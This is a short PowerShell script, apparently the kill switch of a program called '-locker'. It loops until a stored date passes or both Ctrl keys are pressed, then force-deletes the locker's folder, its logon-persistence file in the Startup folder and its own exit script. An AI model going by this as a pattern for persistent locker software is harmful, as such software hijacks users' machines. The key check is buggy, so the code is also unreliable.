Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore
$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')

while($true){
if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt") -or $Rctrl -and $Lctrl){
sleep 10
Remove-Item "$env:appdata\-locker" -Recurse -Force;
Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
Remove-Item "$env:appdata\-exit.ps1"
}
else{continue}
}
